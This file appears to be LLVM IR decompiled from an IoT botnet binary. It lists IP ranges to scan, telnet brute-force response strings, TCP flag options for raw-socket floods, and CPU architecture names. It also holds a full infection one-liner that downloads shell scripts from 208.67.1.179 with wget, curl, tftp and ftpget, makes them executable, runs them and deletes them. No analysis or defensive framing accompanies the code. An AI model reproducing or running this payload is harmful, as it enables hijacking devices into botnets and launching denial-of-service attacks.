source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@cf = internal unnamed_addr global i1 false
@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805b00c.2 = global i32 0
@global_var_805b024.3 = local_unnamed_addr global i32* @global_var_805b00c.2
@global_var_805ab64.4 = constant i32 0
@global_var_805b010.6 = local_unnamed_addr global i32 0
@global_var_805b540.7 = global i32 0
@global_var_805b544.8 = local_unnamed_addr global i32 0
@global_var_805b548.9 = local_unnamed_addr global i32 0
@global_var_805b270.10 = local_unnamed_addr global i32 4095
@global_var_805b26c.11 = local_unnamed_addr global i32 362436
@global_var_8057afb.12 = constant [7 x i8] c"(null)\00"
@global_var_8057b02.14 = constant [3 x i8] c"-c\00"
@global_var_80577bb.15 = constant [3 x i8] c"sh\00"
@global_var_8057b05.16 = constant [8 x i8] c"/bin/sh\00"
@global_var_8057b20.17 = constant i32 -1
@global_var_8057f20.18 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_8057f2e.19 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_805b520.20 = local_unnamed_addr global i32 0
@global_var_8057f37.21 = constant [5 x i8] c"PING\00"
@global_var_8057aef.22 = constant [8 x i8] c"busybox\00"
@global_var_8057af7.23 = constant i32 2293796
@global_var_8057af9.24 = constant i32 1848115235
@global_var_805b220.25 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057aef.22, i32 0, i32 0), i8* bitcast (i32* @global_var_8057af7.23 to i8*), i8* bitcast (i32* @global_var_8057af9.24 to i8*)]
@global_var_8057ac3.26 = constant [7 x i8] c"nvalid\00"
@global_var_8057aca.27 = constant [6 x i8] c"ailed\00"
@global_var_8057ad0.28 = constant [9 x i8] c"ncorrect\00"
@global_var_8057ad9.29 = constant [6 x i8] c"enied\00"
@global_var_8057adf.30 = constant [5 x i8] c"rror\00"
@global_var_8057ae4.31 = constant [7 x i8] c"oodbye\00"
@global_var_8057aeb.32 = constant [4 x i8] c"bad\00"
@global_var_805b200.33 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057ac3.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057aca.27, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057ad0.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057ad9.29, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057adf.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057ae4.31, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8057aeb.32, i32 0, i32 0)]
@global_var_805b528.34 = local_unnamed_addr global i32 0
@global_var_805b52c.35 = local_unnamed_addr global i32 0
@global_var_80617b4.36 = local_unnamed_addr global i32 0
@global_var_8057f3c.37 = constant [6 x i8] c":>%$#\00"
@global_var_805b537.38 = local_unnamed_addr global i32 0
@global_var_805b538.39 = local_unnamed_addr global i32 0
@global_var_8057f43.42 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_8057f4f.43 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_8057f5d.44 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_8057f68.45 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_8057f75.46 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_8057f80.47 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_8057f8d.48 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_8057f99.49 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_8057fa6.50 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_8057fb3.51 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_8057fc0.52 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_8057fce.53 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_8057fd9.54 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_8057fe6.55 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_8057ff3.56 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_8058000.57 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_805800d.58 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_805801a.59 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_8058027.60 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_8058034.61 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_805803f.62 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_805804b.63 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_8058058.64 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_8058063.65 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_805806e.66 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_805807a.67 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_8058086.68 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_8058092.69 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_805809f.70 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_80580ac.71 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_80580b8.72 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_80580c5.73 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_80580d1.74 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_80580dc.75 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_80580e8.76 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_80580f4.77 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_8058100.78 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_805810c.79 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_8058118.80 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_8058125.81 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_8058132.82 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_805813f.83 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_805814c.84 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_8058159.85 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_8058166.86 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_8058173.87 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_8058180.88 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_805818d.89 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_805819a.90 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_80581a7.91 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_80581b5.92 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_80581c2.93 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_80581d0.94 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_80581dd.95 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_80581eb.96 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_80581f9.97 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_8058206.98 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_8058213.99 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_8058220.100 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_805822d.101 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_805823a.102 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_8058247.103 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_8058254.104 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_8058261.105 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_805826e.106 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_805827b.107 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_8058288.108 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_8058295.109 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_80582a2.110 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_80582af.111 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_80582bc.112 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_80582c9.113 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_80582d6.114 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_80582e3.115 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_80582f0.116 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_80582fd.117 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_805830a.118 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_8058317.119 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_8058324.120 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_8058331.121 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_805833e.122 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_805834b.123 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_8058358.124 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_8058365.125 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_8058372.126 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_805837f.127 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_805838c.128 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_8058399.129 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_80583a6.130 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_80583b3.131 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_80583c0.132 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_80583cd.133 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_80583da.134 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_80583e7.135 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_80583f4.136 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_8058401.137 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_805840e.138 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_805841b.139 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_8058428.140 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_8058434.141 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_8058441.142 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_805844e.143 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_805845b.144 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_8058467.145 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_8058474.146 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_8058482.147 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_8058490.148 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_805849d.149 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_80584ab.150 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_80584b9.151 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_80584c6.152 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_80584d4.153 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_80584e1.154 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_80584ee.155 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_80584fc.156 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_805850a.157 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_8058518.158 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_8058526.159 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_8058533.160 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_805853f.161 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_805854d.162 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_805855b.163 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_8058569.164 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_8058577.165 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_8058585.166 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_8058593.167 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_80585a1.168 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_80585af.169 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_80585bd.170 = constant [14 x i8] c"113.167.%d.%d\00"
@global_var_80585cb.171 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_80585d9.172 = constant [14 x i8] c"113.169.%d.%d\00"
@global_var_80585e7.173 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_80585f4.174 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_8058601.175 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_805860e.176 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_805861b.177 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_8058628.178 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_8058635.179 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_8058643.180 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_8058651.181 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_805865f.182 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_805866c.183 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_8058679.184 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_8058687.185 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_8058695.186 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_80586a3.187 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_80586b0.188 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_80586bd.189 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_80586ca.190 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_80586d7.191 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_80586e4.192 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_80586f0.193 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_80586fe.194 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_805870b.195 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_8058719.196 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_8058727.197 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_8058735.198 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_8058742.199 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_8058750.200 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_805875e.201 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_805876c.202 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_805877a.203 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_8058788.204 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_8058796.205 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_80587a3.206 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_80587b1.207 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_80587bf.208 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_80587cd.209 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_80587da.210 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_80587e7.211 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_80587f4.212 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_8058801.213 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_805880e.214 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_805881b.215 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_8058828.216 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_8058836.217 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_8058844.218 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_8058852.219 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_8058860.220 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_805886e.221 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_805887c.222 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_8058889.223 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_8058896.224 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_80588a4.225 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_80588b2.226 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_80588c0.227 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_80588ce.228 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_80588dc.229 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_80588ea.230 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_80588f8.231 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_8058906.232 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_8058913.233 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_8058920.234 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_805892d.235 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_805893a.236 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_8058947.237 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_8058954.238 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_8058962.239 = constant [13 x i8] c"50.233.%d.%d\00"
@global_var_80617a8.240 = local_unnamed_addr global i32 0
@global_var_8057a5e.241 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_8057a6d.242 = constant [6 x i8] c"/tmp/\00"
@global_var_8057a73.243 = constant [6 x i8] c"/var/\00"
@global_var_8057a79.244 = constant [6 x i8] c"/dev/\00"
@global_var_8057a7f.245 = constant [10 x i8] c"/var/run/\00"
@global_var_8057a89.246 = constant [10 x i8] c"/dev/shm/\00"
@global_var_8057a93.247 = constant [6 x i8] c"/mnt/\00"
@global_var_8057a99.248 = constant [7 x i8] c"/boot/\00"
@global_var_8057aa0.249 = constant [6 x i8] c"/usr/\00"
@global_var_8057aa6.250 = constant [6 x i8] c"/opt/\00"
@global_var_805b1c0.251 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_8057a5e.241, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057a6d.242, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057a73.243, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057a79.244, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8057a7f.245, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8057a89.246, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057a93.247, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057a99.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057aa0.249, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057aa6.250, i32 0, i32 0)]
@global_var_805b1ec = external global i32
@global_var_805896f.256 = constant [3 x i8] c"\0D\0A\00"
@global_var_805b240.257 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057ac3.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057aca.27, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8057ad0.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8057ad9.29, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057adf.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057ae4.31, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8057aeb.32, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8057aef.22, i32 0, i32 0), i8* bitcast (i32* @global_var_8057af7.23 to i8*), i8* bitcast (i32* @global_var_8057af9.24 to i8*)]
@global_var_8058972.258 = constant [23 x i8] c"LOGIN FOUND - %s:%s:%s\00"
@global_var_8058989.259 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_805898e.260 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_80578a0.261 = constant [430 x i8] c" cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\0D\0A\00"
@global_var_8057a4e.262 = constant [5 x i8] c"root\00"
@global_var_8057a54.263 = constant [7 x i8] c"telnet\00"
@global_var_8057a5c.264 = constant i32 1680801792
@global_var_805b1a0.265 = local_unnamed_addr global [7 x i8*] [i8* getelementptr inbounds ([430 x i8], [430 x i8]* @global_var_80578a0.261, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057a4e.262, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057a4e.262, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057a54.263, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057a4e.262, i32 0, i32 0), i8* bitcast (i32* @global_var_8057a5c.264 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057a54.263, i32 0, i32 0)]
@global_var_80589b8.266 = constant [6 x i8] c"arfgG\00"
@global_var_80589be.267 = constant [9 x i8] c"HBiug655\00"
@global_var_80589c7.268 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_80589d4.269 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_80589e8.270 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_80589f9.271 = constant [12 x i8] c"GJjyur67458\00"
@global_var_8058a05.272 = constant [12 x i8] c"RYSDk747586\00"
@global_var_8058a11.273 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_8058a1d.274 = constant [10 x i8] c"KHGK7985i\00"
@global_var_8058a27.275 = constant [11 x i8] c"yuituiILYF\00"
@global_var_8058a32.276 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_8058a40.277 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_8058a4c.278 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_8058a59.279 = constant [9 x i8] c"ewqdcftr\00"
@global_var_8058a62.280 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_8058a72.281 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_8058a7d.282 = constant [12 x i8] c"twehgbferhb\00"
@global_var_8058a89.283 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_8058a95.284 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_8058aa3.285 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_8058ab1.286 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_8058abf.287 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_8058ac9.288 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_8058ad7.289 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_8058ae5.290 = constant [12 x i8] c"yteytietyue\00"
@global_var_8058af1.291 = constant [9 x i8] c"qsortEQS\00"
@global_var_8058afa.292 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_8058b0a.293 = constant [4 x i8] c"std\00"
@global_var_8058b0e.294 = constant [4 x i8] c"dts\00"
@global_var_8058b12.295 = constant [4 x i8] c"lsk\00"
@global_var_8058b16.296 = constant [4 x i8] c"kek\00"
@global_var_8058b1a.297 = constant [6 x i8] c"smack\00"
@global_var_8058b20.298 = constant [4 x i8] c"ily\00"
@global_var_8058b24.299 = constant [4 x i8] c"tyf\00"
@global_var_8058b28.300 = constant [4 x i8] c"pos\00"
@global_var_8058b2c.301 = constant [6 x i8] c"cunts\00"
@global_var_8058b40.302 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80589b8.266, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80589be.267, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80589c7.268, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_80589d4.269, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_80589e8.270, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_80589f9.271, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8058a05.272, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8058a11.273, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8058a1d.274, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8058a27.275, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058a32.276, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8058a40.277, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8058a4c.278, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058a59.279, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8058a62.280, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8058a72.281, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8058a7d.282, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8058a89.283, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058a95.284, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058aa3.285, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058ab1.286, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8058abf.287, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058ac9.288, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8058ad7.289, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_8058ae5.290, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8058af1.291, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8058afa.292, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058b0a.293, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058b0e.294, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058b12.295, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058b16.296, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058b1a.297, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058b20.298, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058b24.299, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8058b28.300, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8058b2c.301, i32 0, i32 0)]
@global_var_8058bd0.303 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_8058bec.304 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_8058c0d.305 = constant [4 x i8] c"all\00"
@global_var_8058c11.306 = constant i32 2037579820
@global_var_8058c13.307 = constant [4 x i8] c"syn\00"
@global_var_8058c17.308 = constant [4 x i8] c"rst\00"
@global_var_8058c1b.309 = constant [4 x i8] c"fin\00"
@global_var_8058c1f.310 = constant [4 x i8] c"ack\00"
@global_var_8058c23.311 = constant [4 x i8] c"psh\00"
@global_var_8058c27.312 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_80576c0.313 = constant [5 x i8] c"mips\00"
@global_var_80576c5.314 = constant [7 x i8] c"mipsel\00"
@global_var_80576cc.315 = constant [4 x i8] c"sh4\00"
@global_var_80576d0.316 = constant [4 x i8] c"x86\00"
@global_var_80576d4.317 = constant [5 x i8] c"i686\00"
@global_var_80576d9.318 = constant [4 x i8] c"ppc\00"
